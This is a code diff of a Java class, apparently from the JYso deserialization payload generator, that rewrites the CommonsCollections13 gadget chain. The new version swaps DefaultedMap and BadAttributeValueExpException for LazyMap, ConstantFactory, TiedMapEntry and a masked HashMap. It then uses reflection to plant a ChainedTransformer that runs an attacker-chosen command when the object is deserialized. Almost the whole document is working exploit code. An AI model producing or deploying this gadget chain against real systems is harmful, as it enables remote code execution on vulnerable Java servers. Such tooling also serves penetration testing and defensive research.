@@ -2,41 +2,34 @@ package com.qi4l.JYso.gadgets;
 
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
+import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
-
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantFactory;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.DefaultedMap;
+import org.apache.commons.collections.map.LazyMap;
 
-import javax.management.BadAttributeValueExpException;
-import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
-@Dependencies({"commons-collections:commons-collections:3.2.1"})
-@Authors({Authors.Jayl1n})
-public class CommonsCollections13 implements ObjectPayload<Object>{
+@Dependencies({"commons-collections:commons-collections:3.1"})
+@Authors({Authors.Unam4})
+public class CommonsCollections13 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
-        final Transformer transformerChain = new ChainedTransformer(
-                new Transformer[]{ new ConstantTransformer(1) });
-        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
-        final Map innerMap = new HashMap();
-        final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);
+        final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
+        Transformer         transformerChain = new ChainedTransformer(transformers);
+        Map                 decorate         = LazyMap.decorate(new HashMap(), new ConstantFactory(1));
+        TiedMapEntry        tiedMapEntry     = new TiedMapEntry(decorate, 1);
+        HashMap             hashMap          = Gadgets.maskmapToString(tiedMapEntry, tiedMapEntry);
 
-        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");
+        Reflections.setFieldValue(decorate, "factory", transformerChain);
+        Reflections.setFieldValue(tiedMapEntry, "key", 233);
 
-        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-        Field valfield = val.getClass().getDeclaredField("val");
-        valfield.setAccessible(true);
-        valfield.set(val, entry);
-
-        // arm with actual transformer chain
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
-
-        return val;
+        return hashMap;
+        //return hashtable;
     }
+
 }
